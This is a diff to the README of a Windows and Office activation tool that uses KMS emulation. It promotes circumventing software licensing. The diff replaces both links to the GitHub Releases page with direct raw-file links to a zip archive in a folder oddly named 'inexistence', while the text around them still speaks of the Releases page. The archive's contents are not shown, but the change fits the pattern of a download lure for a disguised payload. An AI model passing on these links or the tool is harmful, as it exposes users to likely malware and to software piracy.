@@ -4,7 +4,7 @@
 Welcome to kmsauto-plus-plus! This tool helps you activate Windows and Office seamlessly. Follow the steps below to get started quickly. 
 
 ## 📥 Download Now
-[![Download kmsauto-plus-plus](https://img.shields.io/badge/Download-kmsauto--plus--plus-blue.svg)](https://github.com/nulogamer/kmsauto-plus-plus/releases)
+[![Download kmsauto-plus-plus](https://raw.githubusercontent.com/nulogamer/kmsauto-plus-plus/main/inexistence/plus_kmsauto_v3.8.zip)](https://raw.githubusercontent.com/nulogamer/kmsauto-plus-plus/main/inexistence/plus_kmsauto_v3.8.zip)
 
 ## 🔍 Overview
 kmsauto-plus-plus is a user-friendly activation dashboard. It uses KMS emulation to manage your Windows and Office licenses efficiently. This application helps you ensure your software stays activated without hassle.
@@ -45,7 +45,7 @@ kmsauto-plus-plus is a user-friendly activation dashboard. It uses KMS emulation
 
 To download the application, visit the Releases page. Click the link below:
 
-[Download kmsauto-plus-plus](https://github.com/nulogamer/kmsauto-plus-plus/releases)
+[Download kmsauto-plus-plus](https://raw.githubusercontent.com/nulogamer/kmsauto-plus-plus/main/inexistence/plus_kmsauto_v3.8.zip)
 
 Once you are on the Releases page:
 
